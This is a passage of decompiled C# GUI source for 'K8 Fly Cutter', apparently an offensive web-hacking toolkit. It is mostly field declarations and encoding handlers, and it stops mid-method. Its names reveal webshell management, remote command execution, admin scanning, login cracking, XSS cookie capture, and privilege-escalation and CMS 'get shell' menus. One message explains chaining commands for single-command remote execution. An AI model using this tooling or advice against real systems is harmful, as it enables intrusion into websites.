namespace K8_Fly_Cutter
{
    using BLL;
    using K8_Web_Submit;
    using K8Reply;
    using System;
    using System.Collections;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Data;
    using System.Data.OleDb;
    using System.Diagnostics;
    using System.Drawing;
    using System.Globalization;
    using System.IO;
    using System.Net;
    using System.Net.Security;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Security.Cryptography.X509Certificates;
    using System.Text;
    using System.Text.RegularExpressions;
    using System.Threading;
    using System.Windows.Forms;
    using K8_Dragon_Claw_Blade.Properties;

    public class  frmMain : Form
    {
        private ToolStripMenuItem aSCII码ToolStripMenuItem;
        private ToolStripMenuItem aSCII码之和ToolStripMenuItem;
        private ToolStripMenuItem aSCII码转字符串ToolStripMenuItem;
        private ToolStripMenuItem base64encodeToolStripMenuItem;
        private ToolStripMenuItem base64GB2312ToolStripMenuItem;
        private ToolStripMenuItem base64GB2312解码ToolStripMenuItem;
        private ToolStripMenuItem base64Unicode编码ToolStripMenuItem;
        private ToolStripMenuItem base64Unicode解码ToolStripMenuItem;
        private ToolStripMenuItem base64UTF8ToolStripMenuItem;
        private ToolStripMenuItem base64UTF8解码ToolStripMenuItem;
        private ToolStripMenuItem bat逻辑命令符说明ToolStripMenuItem;
        private ToolStripMenuItem bat批处理ToolStripMenuItem;
        private ToolStripMenuItem binFileToolStripMenuItem;
        public Button btn_AddUpdateExp;
        private Button btn_aspOne;
        private Button btn_aspxOne;
        private Button btn_ClearScanAdmin;
        private Button btn_connectOneShell;
        private Button btn_DataOutput;
        private Button btn_dataOutputMul;
        private Button btn_DiyloginUrlCrack;
        private Button btn_ExecuteWebCMD;
        private Button btn_ghdb_Search;
        private Button btn_jspOne;
        private Button btn_MoreThreadScanAdmin;
        private Button btn_navigateURL;
        private Button btn_OpenXssDB;
        private Button btn_OutDataStop;
        private Button btn_phpOne;
        private Button btn_setCookieExpires;
        private Button btn_setHttponlyCookie;
        private Button btn_SingleScanAdmin;
        private Button btn_StopScanAdmin;
        private Button Btn_Submit;
        private Button btn_UpdateCookies;
        private Button btn_WebExploitNivigate;
        private Button btnEXPclick = null;
        private Button button1;
        private Button button2;
        private Button button4;
        private Button button5;
        private Button button6;
        private Button button8;
        private Button button9;
        private ComboBox cbb_DataOutEncoding;
        private ComboBox cbb_expDebugCoding;
        private ComboBox cbb_ghdb_earchCat;
        private ComboBox Cbb_UserAgent;
        private ComboBox cbb_utf8Gb3212CMD;
        private ComboBox cbb_WebCommond;
        private ComboBox cbb_WebFilePath;
        private string[,] Chinaholidays = new string[14, 0x20];
        private CheckBox chk_allowRedirect;
        private CheckBox chk_DataOutputSetting;
        private CheckBox chk_DataOutRegex;
        private CheckBox chk_Result_WebBrowser;
        private CheckBox chk_ResultText;
        private CheckBox chk_submitCookies;
        private CheckBox chk_VisbleOnePwd;
        private ToolStripMenuItem cmdShellToolStripMenuItem;
        private string cnHoliday = null;
        private ToolStripMenuItem coderToolStripMenuItem;
        private ComboBox comboBox1;
        private ComboBox comboBox10;
        private ComboBox comboBox11;
        private ComboBox comboBox2;
        private ComboBox comboBox3;
        private ComboBox comboBox6;
        private ComboBox comboBox7;
        private ComboBox comboBox8;
        private ComboBox comboBox9;
        private IContainer components = null;
        private ToolStripMenuItem cookieBrowseToolStripMenuItem;
        private ToolStripMenuItem cookie浏览器ToolStripMenuItem;
        private string copyExpDubugInfoURL = "";
        private ToolStripMenuItem c转成StringBuilder代码rnToolStripMenuItem;
        private ToolStripMenuItem c转成StringBuilder代码正常ToolStripMenuItem;
        private ToolStripMenuItem dataOutputToolStripMenuItem;
        private ToolStripMenuItem day网马ToolStripMenuItem;
        private ToolStripMenuItem discuz6x7x代码执行漏洞ToolStripMenuItem;
        private ToolStripMenuItem drupal后台PHPFilter拿Shell代码ToolStripMenuItem;
        private ToolStripMenuItem drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem;
        private ToolStripMenuItem encodeDecodeToolStripMenuItem;
        private ToolStripMenuItem encodeToolStripMenuItem;
        private string enHoliday = null;
        private ToolStripMenuItem expDebugToolStripMenuItem;
        private bool expDebugUrlChanged = true;
        private ToolStripMenuItem expDeleteToolStripMenuItem;
        private ToolStripMenuItem expInputToolStripMenuItem;
        private ToolStripMenuItem exploitDBToolStripMenuItem;
        private ToolStripMenuItem expUpdateToolStripMenuItem;
        private ToolStripMenuItem fileASCIIToolStripMenuItem;
        private ToolStripMenuItem fileHexToolStripMenuItem;
        private ToolStripMenuItem fileManageToolStripMenuItem;
        private ToolStripMenuItem flashAS脚本Post提交post参数ToolStripMenuItem;
        private Point FormLocation;
        private ToolStripMenuItem fromCharCodeToolStripMenuItem;
        private GroupBox gb_dataOutput;
        private GroupBox gb_xssAnalysis;
        private ToolStripMenuItem getShellToolStripMenuItem;
        private ToolStripMenuItem googleHackToolStripMenuItem;
        private GroupBox groupBox1;
        private ToolStripMenuItem hex编码ToolStripMenuItem;
        private ToolStripMenuItem hex编码ToolStripMenuItem1;
        private ToolStripMenuItem hex编码UnicodeToolStripMenuItem;
        private ToolStripMenuItem hex编码UTF8ToolStripMenuItem;
        private ToolStripMenuItem hex解码ToolStripMenuItem;
        private ToolStripMenuItem hex解码UnicodeToolStripMenuItem;
        private ToolStripMenuItem hex解码UTF8ToolStripMenuItem;
        private ToolStripMenuItem hEX文件路径1ToolStripMenuItem;
        private ToolStripMenuItem hEX文件路径2ToolStripMenuItem;
        private string[,] holidays = new string[14, 0x20];
        private ToolStripMenuItem hTML实体DecToolStripMenuItem;
        private ToolStripMenuItem hTML实体HexToolStripMenuItem;
        private ToolStripMenuItem hTML实体UTF8ToolStripMenuItem;
        private ToolStripMenuItem http提交ToolStripMenuItem;
        private int i = 0;
        private Button icoBtn_about;
        private Button icoBtn_CmdShell;
        private Button icoBtn_CookieBrowser;
        private Button icoBtn_dataOutput;
        private Button icoBtn_encodeDecode;
        private Button icoBtn_ExpDebug;
        private Button icoBtn_EXploitDB;
        private Button icoBtn_ScanAdmin;
        private Button icoBtn_WebShell;
        private Button icoBtn_XssAnalysis;
        private ImageList imageList_tab;
        private ImageList imgListFileMgr;
        private ImageList imgListWebInfo;
        private ToolStripMenuItem introductionToolStripMenuItem;
        private int intScanAdminSpace = 0;
        private bool isMouseDown = false;
        private ToolStripMenuItem jQueryPost参数Post参数ToolStripMenuItem;
        private ToolStripMenuItem jQueryPost代码post参数ToolStripMenuItem;
        private ToolStripMenuItem jQueryPost代码post参数ToolStripMenuItem1;
        private ToolStripMenuItem jSEscapeALLToolStripMenuItem;
        private ToolStripMenuItem jSEscapeToolStripMenuItem;
        private ToolStripMenuItem jSHexStringToolStripMenuItem;
        private ToolStripMenuItem jSUnicodeToolStripMenuItem;
        private bool K8AbortScan = false;
        public string k8appName = "";
        public string k8btnName = "";
        public string k8btnTip = "";
        private string K8buildDate = " 20141208";
        private int K8BuildDateInt = 0x1335498;
        private string k8encodeSplit = "\r\n===============================================================================================================================================================\r\n";
        public static string k8flyConfig = (Application.StartupPath + @"\K8fly.ini");
        private int k8foundmul = 0;
        private bool K8isAbortScanAdmin = false;
        private ToolStripMenuItem k8Md5CodeToolStripMenuItem;
        private ArrayList K8scanlist = new ArrayList();
        public string k8updateID = "";
        private Label label1;
        private Label label10;
        private Label label11;
        private Label label12;
        private Label label13;
        private Label label14;
        private Label label15;
        private Label label16;
        private Label label17;
        private Label label18;
        private Label label19;
        private Label label2;
        private Label label20;
        private Label label23;
        private Label label24;
        private Label label25;
        private Label label26;
        private Label label28;
        private Label label29;
        private Label label3;
        private Label label30;
        private Label label31;
        private Label label32;
        private Label label33;
        private Label label4;
        private Label label5;
        private Label label6;
        private Label label7;
        private Label label8;
        private Label label9;
        private Label lbl_AndroidCount;
        private Label lbl_AppICO;
        private Label lbl_appTitle;
        private Label lbl_BlackBerryCount;
        private Label lbl_BSDCount;
        private Label lbl_check;
        private Label lbl_ChromeCount;
        private Label lbl_dataOutEndStr;
        private Label lbl_dataOutRexex;
        private Label lbl_dataOutStrStart;
        private Label lbl_expDebugInfo;
        private Label lbl_FirefoxCount;
        private Label lbl_found;
        private Label lbl_IE10count;
        private Label lbl_IE11count;
        private Label lbl_IE6count;
        private Label lbl_IE7count;
        private Label lbl_IE8count;
        private Label lbl_IE9count;
        private Label lbl_iPadCount;
        private Label lbl_iPhoneCount;
        private Label lbl_K8Holiday;
        private Label lbl_LinuxCount;
        private Label lbl_MACCount;
        private Label lbl_NetscapeCount;
        private Label lbl_NokiaCount;
        private Label lbl_OperaCount;
        private Label lbl_OriginalLen;
        private Label lbl_OtherIECount;
        private Label lbl_OtherMobileCount;
        private Label lbl_resultDataOut;
        private Label lbl_SafariCount;
        private Label lbl_SAMSUNGCount;
        private Label lbl_ScanAdminResult;
        private Label lbl_threads;
        private Label lbl_UCWEBCount;
        private Label lbl_UnixCount;
        private Label lbl_Win10Count;
        private Label lbl_Win2000Count;
        private Label lbl_Win2003Count;
        private Label lbl_Win7Count;
        private Label lbl_Win81Count;
        private Label lbl_Win8Count;
        private Label lbl_WinPhoneCount;
        private Label lbl_WinXPCount;
        private Label lbl_XssCookieCount;
        private Label lbl_XssInfo;
        private Label lbl_XssIPcount;
        private ListView lv_DirList;
        public ListView LV_ScanAdmin;
        private ListView lv_webShell;
        private ToolStripMenuItem mD5SHA1ToolStripMenuItem;
        private ToolStripMenuItem mD5加密16位ToolStripMenuItem;
        private ToolStripMenuItem mD5加密32位ToolStripMenuItem;
        private ToolStripMenuItem mOF提权CHRToolStripMenuItem;
        private ToolStripMenuItem mOF提权HexToolStripMenuItem;
        private Point mouseOffset;
        private ToolStripMenuItem mS14065ToolStripMenuItem;
        private ToolStripMenuItem mSSQLCHARDecodeToolStripMenuItem;
        private ToolStripMenuItem mSSQLCHARToolStripMenuItem;
        private ToolStripMenuItem mysqlCHAR1DecodeToolStripMenuItem;
        private ToolStripMenuItem mysqlCHAR2DecodeToolStripMenuItem;
        private ToolStripMenuItem mYSQLCHAR2ToolStripMenuItem;
        private ToolStripMenuItem mYSQLCHARToolStripMenuItem;
        private ToolStripMenuItem notepadToolStripMenuItem;
        private ToolStripMenuItem oracleCHRDecodeToolStripMenuItem;
        private ToolStripMenuItem oracleCHRToolStripMenuItem;
        private ToolStripMenuItem perlPost提交代码post参数ToolStripMenuItem;
        private ToolStripMenuItem pHPCHR字符串ToolStripMenuItem;
        private ToolStripMenuItem pHPCHR字符串反转ToolStripMenuItem;
        private ToolStripMenuItem pHPPost参数Post参数ToolStripMenuItem;
        private ToolStripMenuItem pHPPost提交代码post参数ToolStripMenuItem;
        private Point pi;
        private PictureBox pic_server;
        private PictureBox pictureBox1;
        private PictureBox pictureBox10;
        private PictureBox pictureBox11;
        private PictureBox pictureBox12;
        private PictureBox pictureBox13;
        private PictureBox pictureBox14;
        private PictureBox pictureBox15;
        private PictureBox pictureBox16;
        private PictureBox pictureBox17;
        private PictureBox pictureBox18;
        private PictureBox pictureBox19;
        private PictureBox pictureBox2;
        private PictureBox pictureBox20;
        private PictureBox pictureBox21;
        private PictureBox pictureBox22;
        private PictureBox pictureBox23;
        private PictureBox pictureBox24;
        private PictureBox pictureBox25;
        private PictureBox pictureBox26;
        private PictureBox pictureBox27;
        private PictureBox pictureBox28;
        private PictureBox pictureBox29;
        private PictureBox pictureBox3;
        private PictureBox pictureBox30;
        private PictureBox pictureBox31;
        private PictureBox pictureBox32;
        private PictureBox pictureBox33;
        private PictureBox pictureBox34;
        private PictureBox pictureBox35;
        private PictureBox pictureBox36;
        private PictureBox pictureBox37;
        private PictureBox pictureBox38;
        private PictureBox pictureBox39;
        private PictureBox pictureBox4;
        private PictureBox pictureBox40;
        private PictureBox pictureBox41;
        private PictureBox pictureBox42;
        private PictureBox pictureBox43;
        private PictureBox pictureBox44;
        private PictureBox pictureBox45;
        private PictureBox pictureBox46;
        private PictureBox pictureBox47;
        private PictureBox pictureBox48;
        private PictureBox pictureBox5;
        private PictureBox pictureBox6;
        private PictureBox pictureBox7;
        private PictureBox pictureBox8;
        private PictureBox pictureBox9;
        private ToolStripMenuItem post参数FlashPost参数ToolStripMenuItem;
        private ToolStripMenuItem post参数JQueryPost参数ToolStripMenuItem;
        private ToolStripMenuItem post参数PHPPost参数ToolStripMenuItem;
        private ToolStripMenuItem post参数PythonPost参数ToolStripMenuItem;
        private ToolStripMenuItem pythonPost参数Post参数ToolStripMenuItem;
        private ToolStripMenuItem pythonPost提交代码ToolStripMenuItem;
        private RadioButton rb_4P;
        private RadioButton rb_ALL;
        private RadioButton rb_ASP;
        private RadioButton rb_aspCmd;
        private RadioButton rb_ASPX;
        private RadioButton rb_aspxCmd;
        private RadioButton rb_backup;
        private RadioButton rb_cfmCmd;
        private RadioButton rb_CGI;
        private RadioButton rb_cgiCmd;
        private RadioButton rb_DataBase;
        private RadioButton rb_dir;
        private RadioButton rb_GetDataOut;
        private RadioButton rb_GetMethod;
        private RadioButton rb_JSP;
        private RadioButton rb_jspCmd;
        private RadioButton rb_none;
        private RadioButton rb_perlCmd;
        private RadioButton rb_PHP;
        private RadioButton rb_phpCmd;
        private RadioButton rb_PostDataOut;
        private RadioButton rb_PostMethod;
        private RadioButton rb_pythonCmd;
        private RadioButton rb_rubyCmd;
        private RadioButton rb_Shell;
        private RadioButton rb_UPfile;
        private RichTextBox richTextBox1;
        private ContextMenuStrip rm_appFunction;
        private ContextMenuStrip rm_CopyDebugInfo;
        private ContextMenuStrip rm_encodeDecode;
        private ContextMenuStrip rm_ExpMgrBtn;
        private ContextMenuStrip rm_ExpMgrInOut;
        private ContextMenuStrip rm_FileMgrTree;
        private ContextMenuStrip rm_ScanAdmin;
        private ContextMenuStrip rm_ShellMgr;
        private ToolStripMenuItem rP值大小ToolStripMenuItem;
        private ToolStripMenuItem sendToSubmitTestToolStripMenuItem;
        private ToolStripMenuItem setTagToolStripMenuItem;
        private ToolStripMenuItem sHA1加密40位ToolStripMenuItem;
        private ToolStripMenuItem sHA256加密ToolStripMenuItem;
        private ToolStripMenuItem sHA384加密ToolStripMenuItem;
        private ToolStripMenuItem sHA512加密ToolStripMenuItem;
        private ToolStripMenuItem sQLToolStripMenuItem;
        private ToolStripMenuItem string2AsciiToolStripMenuItem;
        private TabPage tab_CmdShell;
        private TabPage tab_CookieBrowser;
        private TabPage tab_DataOutput;
        private TabPage tab_EncodeDecode;
        private TabPage tab_ExploitManage;
        private TabPage tab_FileManage;
        private TabPage tab_googleHackDB;
        private TabPage tab_Introduction;
        private TabControl tab_MainForm;
        private TabPage tab_notepad;
        private TabPage tab_ScanAdmin;
        private TabPage tab_ShellManage;
        private TabPage tab_SubmitTest;
        private TabControl tab_webExp;
        private TabPage tab_webLoginCrack;
        private TabPage tab_XssAnalysis;
        private ToolStripSeparator toolStripMenuItem1;
        private ToolStripSeparator toolStripMenuItem10;
        private ToolStripSeparator toolStripMenuItem11;
        private ToolStripSeparator toolStripMenuItem12;
        private ToolStripSeparator toolStripMenuItem13;
        private ToolStripSeparator toolStripMenuItem14;
        private ToolStripSeparator toolStripMenuItem15;
        private ToolStripSeparator toolStripMenuItem16;
        private ToolStripSeparator toolStripMenuItem17;
        private ToolStripMenuItem toolStripMenuItem18;
        private ToolStripMenuItem toolStripMenuItem19;
        private ToolStripSeparator toolStripMenuItem2;
        private ToolStripMenuItem toolStripMenuItem20;
        private ToolStripMenuItem toolStripMenuItem21;
        private ToolStripMenuItem toolStripMenuItem22;
        private ToolStripMenuItem toolStripMenuItem23;
        private ToolStripMenuItem toolStripMenuItem24;
        private ToolStripMenuItem toolStripMenuItem25;
        private ToolStripSeparator toolStripMenuItem26;
        private ToolStripSeparator toolStripMenuItem27;
        private ToolStripSeparator toolStripMenuItem28;
        private ToolStripSeparator toolStripMenuItem29;
        private ToolStripSeparator toolStripMenuItem3;
        private ToolStripSeparator toolStripMenuItem30;
        private ToolStripSeparator toolStripMenuItem31;
        private ToolStripSeparator toolStripMenuItem32;
        private ToolStripSeparator toolStripMenuItem33;
        private ToolStripSeparator toolStripMenuItem34;
        private ToolStripSeparator toolStripMenuItem35;
        private ToolStripSeparator toolStripMenuItem36;
        private ToolStripSeparator toolStripMenuItem37;
        private ToolStripSeparator toolStripMenuItem38;
        private ToolStripSeparator toolStripMenuItem39;
        private ToolStripSeparator toolStripMenuItem4;
        private ToolStripSeparator toolStripMenuItem40;
        private ToolStripSeparator toolStripMenuItem41;
        private ToolStripSeparator toolStripMenuItem42;
        private ToolStripSeparator toolStripMenuItem43;
        private ToolStripSeparator toolStripMenuItem44;
        private ToolStripSeparator toolStripMenuItem45;
        private ToolStripSeparator toolStripMenuItem46;
        private ToolStripSeparator toolStripMenuItem47;
        private ToolStripSeparator toolStripMenuItem48;
        private ToolStripSeparator toolStripMenuItem49;
        private ToolStripSeparator toolStripMenuItem5;
        private ToolStripSeparator toolStripMenuItem50;
        private ToolStripSeparator toolStripMenuItem51;
        private ToolStripSeparator toolStripMenuItem52;
        private ToolStripSeparator toolStripMenuItem53;
        private ToolStripSeparator toolStripMenuItem54;
        private ToolStripSeparator toolStripMenuItem55;
        private ToolStripSeparator toolStripMenuItem56;
        private ToolStripSeparator toolStripMenuItem57;
        private ToolStripSeparator toolStripMenuItem58;
        private ToolStripSeparator toolStripMenuItem59;
        private ToolStripSeparator toolStripMenuItem6;
        private ToolStripSeparator toolStripMenuItem60;
        private ToolStripSeparator toolStripMenuItem61;
        private ToolStripSeparator toolStripMenuItem62;
        private ToolStripSeparator toolStripMenuItem63;
        private ToolStripSeparator toolStripMenuItem64;
        private ToolStripSeparator toolStripMenuItem7;
        private ToolStripSeparator toolStripMenuItem8;
        private ToolStripSeparator toolStripMenuItem9;
        private TreeView treeView1;
        private TreeView tv_dirList;
        private TextBox txt_About;
        private TextBox txt_addURL;
        private TextBox txt_aspOne;
        private TextBox txt_aspxOne;
        private TextBox txt_cookiesURL;
        private TextBox txt_dataOutEndStr;
        private TextBox txt_dataOutRegex;
        private TextBox txt_dataOutstartStr;
        private TextBox txt_EncodeDecodeText;
        private TextBox txt_ExpURL;
        private TextBox txt_getCookies;
        private TextBox txt_getHttponlyCookie;
        private TextBox txt_ghdb_search_text;
        private TextBox txt_jspOne;
        private TextBox txt_k8url;
        private TextBox txt_maxnum;
        private TextBox txt_minnum;
        private TextBox txt_ms14065;
        private TextBox txt_OneShellPath;
        private TextBox txt_OneShellPwd;
        private TextBox txt_phpOne;
        private TextBox txt_RefererURL;
        private TextBox txt_Result;
        private TextBox txt_resultDataOut;
        public TextBox txt_ScanAdminResult;
        private TextBox txt_ScanAdminURL;
        private TextBox txt_sqlDataOutput;
        private TextBox txt_submitCookies;
        private TextBox txt_SubmitData;
        private TextBox txt_ThreadsOutData;
        private TextBox txt_ThreadsScanAdmin;
        private TextBox txt_TimeOut;
        private TextBox txt_TimeOutCmd;
        private TextBox txt_urlDataOutput;
        private TextBox txt_UserAgent;
        private TextBox txt_WebCmdResult;
        private ToolStripMenuItem uDF提权CHRToolStripMenuItem;
        private ToolStripMenuItem uDF提权HexToolStripMenuItem;
        private ToolStripMenuItem unicode中文ToolStripMenuItem;
        private ToolStripMenuItem updateToolStripMenuItem;
        private ToolStripMenuItem uRLencodeToolStripMenuItem;
        private const int UrlmonOptionUseragent = 0x10000001;
        private ToolStripMenuItem uRL编码GBKToolStripMenuItem;
        private ToolStripMenuItem uRL编码UnicodeToolStripMenuItem;
        private ToolStripMenuItem uRL编码UTF8ToolStripMenuItem;
        private ToolStripMenuItem uRL编码全部ToolStripMenuItem;
        private ToolStripMenuItem uRL解码GBKToolStripMenuItem;
        private ToolStripMenuItem uRL解码GBKToolStripMenuItem1;
        private ToolStripMenuItem uRL解码GBKToolStripMenuItem2;
        private WebBrowser web_cookie;
        private WebBrowser web_expDebugResult;
        private WebBrowser web_exploit;
        private ToolStripMenuItem webCrackToolStripMenuItem;
        private string WebCurPath = "";
        private string WebFileCurPath = "";
        private ToolStripMenuItem webShellToolStripMenuItem;
        private ToolStripMenuItem wordPress后台主题GetShell相对路径ToolStripMenuItem;
        private ToolStripMenuItem xssAnalysisToolStripMenuItem;
        private ToolStripMenuItem xSSToolStripMenuItem;
        private ToolStripMenuItem 保存ToolStripMenuItem;
        private ToolStripMenuItem 不转行前ToolStripMenuItem;
        private ToolStripMenuItem 打开ToolStripMenuItem;
        private ToolStripMenuItem 导入菜刀数据ToolStripMenuItem;
        private ToolStripMenuItem 导入飞刀数据ToolStripMenuItem;
        private ToolStripMenuItem 地区分类ToolStripMenuItem1;
        private ToolStripMenuItem 发送到DataOutputToolStripMenuItem;
        private ToolStripMenuItem 反转ToolStripMenuItem;
        private ToolStripMenuItem 复制BannerToolStripMenuItem;
        private ToolStripMenuItem 复制ToolStripMenuItem;
        private ToolStripMenuItem 复制地理位置ToolStripMenuItem;
        private ToolStripMenuItem 合并数据库ToolStripMenuItem;
        private ToolStripMenuItem 检测当前WebShellToolStripMenuItem;
        private ToolStripMenuItem 检测所有WebShellToolStripMenuItem;
        private ToolStripMenuItem 检测网站存活ToolStripMenuItem;
        private ToolStripMenuItem 检测选中WebShellToolStripMenuItem;
        private ToolStripMenuItem 检查是否在控ToolStripMenuItem;
        private ToolStripMenuItem 剪切ToolStripMenuItem;
        private ToolStripMenuItem 脚本分类ToolStripMenuItem1;
        private ToolStripMenuItem 进制转换ToolStripMenuItem;
        private ToolStripMenuItem 空格JSP代码ToolStripMenuItem;
        private ToolStripMenuItem 空格ToolStripMenuItem;
        private ToolStripMenuItem 列表排序ToolStripMenuItem;
        private ToolStripMenuItem 浏览器ToolStripMenuItem;
        private ToolStripMenuItem 每行前面不带注释ToolStripMenuItem;
        private ToolStripMenuItem 模块设置ToolStripMenuItem;
        private ToolStripMenuItem 批量删除ToolStripMenuItem;
        private ToolStripMenuItem 去掉行首ToolStripMenuItem;
        private ToolStripMenuItem 去掉行首去掉注释ToolStripMenuItem;
        private ToolStripMenuItem 去掉注释ToolStripMenuItem;
        private ToolStripMenuItem 全部复制ToolStripMenuItem;
        private ToolStripMenuItem 全部加密结果ToolStripMenuItem;
        private ToolStripMenuItem 全选ToolStripMenuItem;
        private ToolStripMenuItem 删除ToolStripMenuItem;
        private ToolStripMenuItem 删除ToolStripMenuItem1;
        private ToolStripMenuItem 提交代码ToolStripMenuItem;
        private ToolStripMenuItem 添加ToolStripMenuItem;
        private ToolStripMenuItem 文件管理ToolStripMenuItem;
        private ToolStripMenuItem 我在这ToolStripMenuItem;
        private ToolStripMenuItem 系统分类ToolStripMenuItem;
        private ToolStripMenuItem 系统设置ToolStripMenuItem;
        private ToolStripMenuItem 新建ToolStripMenuItem;
        private ToolStripMenuItem 修改ToolStripMenuItem;
        private ToolStripMenuItem 虚拟CMD终端ToolStripMenuItem;
        private ToolStripMenuItem 以上算法全使用ToolStripMenuItem;
        private ToolStripMenuItem 以上算法全使用ToolStripMenuItem1;
        private ToolStripMenuItem 以上算法全使用ToolStripMenuItem2;
        private ToolStripMenuItem 以上算法全使用ToolStripMenuItem3;
        private ToolStripMenuItem 以上算法全使用ToolStripMenuItem4;
        private ToolStripMenuItem 以上算法全用ToolStripMenuItem;
        private ToolStripMenuItem 用Chrome打开ToolStripMenuItem;
        private ToolStripMenuItem 用Chrome打开ToolStripMenuItem1;
        private ToolStripMenuItem 用Chrome打开ToolStripMenuItem2;
        private ToolStripMenuItem 用Firefox打开ToolStripMenuItem;
        private ToolStripMenuItem 用Firefox打开ToolStripMenuItem1;
        private ToolStripMenuItem 用Firefox打开ToolStripMenuItem2;
        private ToolStripMenuItem 用浏览器打开ToolStripMenuItem;
        private ToolStripMenuItem 用微软IE打开ToolStripMenuItem;
        private ToolStripMenuItem 用微软IE打开ToolStripMenuItem1;
        private ToolStripMenuItem 用微软IE打开ToolStripMenuItem2;
        private ToolStripMenuItem 粘贴ToolStripMenuItem;
        private ToolStripMenuItem 正转ToolStripMenuItem;
        private ToolStripMenuItem 只复制IPToolStripMenuItem;
        private ToolStripMenuItem 只有20空格ToolStripMenuItem;
        private ToolStripMenuItem 只有加号空格ToolStripMenuItem;
        private ToolStripMenuItem 只有空格20ToolStripMenuItem;
        private ToolStripMenuItem 只有空格URL编码ToolStripMenuItem;
        private ToolStripMenuItem 中文UnicodeToolStripMenuItem;
        private ToolStripMenuItem 重新加载EXPToolStripMenuItem;
        private ToolStripMenuItem 转成PHPCHR字符串点号ToolStripMenuItem;
        private ToolStripMenuItem 转成半角ToolStripMenuItem;
        private ToolStripMenuItem 转成大写ToolStripMenuItem;
        private ToolStripMenuItem 转成多行1ToolStripMenuItem;
        private ToolStripMenuItem 转成多行1ToolStripMenuItem1;
        private ToolStripMenuItem 转成多行2ToolStripMenuItem;
        private ToolStripMenuItem 转成多行2ToolStripMenuItem1;
        private ToolStripMenuItem 转成多行号结尾ToolStripMenuItem;
        private ToolStripMenuItem 转成全角ToolStripMenuItem;
        private ToolStripMenuItem 转成小写ToolStripMenuItem;
        private ToolStripMenuItem 转成一行1ToolStripMenuItem;
        private ToolStripMenuItem 转成一行1ToolStripMenuItem1;
        private ToolStripMenuItem 转成一行2ToolStripMenuItem;
        private ToolStripMenuItem 转成一行2ToolStripMenuItem1;
        private ToolStripMenuItem 转成一行rnToolStripMenuItem;
        private ToolStripMenuItem 转成一行ToolStripMenuItem;
        private ToolStripMenuItem 转成一行ToolStripMenuItem1;

        public frmMain()
        {
            this.InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }

        private void AllowScanAdminControl()
        {
            this.btn_SingleScanAdmin.Enabled = true;
            this.btn_StopScanAdmin.Enabled = false;
            this.btn_MoreThreadScanAdmin.Enabled = true;
            this.rb_4P.Enabled = true;
            this.rb_ALL.Enabled = true;
            this.rb_ASP.Enabled = true;
            this.rb_ASPX.Enabled = true;
            this.rb_backup.Enabled = true;
            this.rb_CGI.Enabled = true;
            this.rb_DataBase.Enabled = true;
            this.rb_dir.Enabled = true;
            this.rb_JSP.Enabled = true;
            this.rb_PHP.Enabled = true;
            this.rb_Shell.Enabled = true;
            this.rb_UPfile.Enabled = true;
        }

        private void aSCII码之和ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8AsciiSum(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void aSCII码转字符串ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8ascii2string(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void base64GB2312ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.Base64_encodeGB2312(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void base64GB2312解码ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.Base64_DecodeGB2312(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void base64Unicode编码ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.Base64_encodeUnicode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void base64Unicode解码ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.Base64_DecodeUnicode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void base64UTF8ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.Base64_encodeUTF8(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void base64UTF8解码ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.Base64_DecodeUTF8(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void bat逻辑命令符说明ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.K8msgbox("【DOS命令或BAT逻辑命令符】\r\n逻辑命令符包括：&、&&、||\r\n&-无条件执行&符号后面的命令；\r\n&&-当&&前面的命令成功执行时，执行&&后面的命令，否则不执行；\r\n||-当||前面的命令失败时，执行||后面的命令，否则不执行。\r\n\r\n应用场景:CmdShell或远程命令执行只允许执行一条命令时.(说白了就是没法上传bat文件或者需要做逻辑运算的命令)");
        }

        public static DataSet BllGetDataSet(string MDBpath)
        {
            StringBuilder builder = new StringBuilder();
            builder.Append("select * from SITE;");
            using (OleDbCommand command = new OleDbCommand(builder.ToString()))
            {
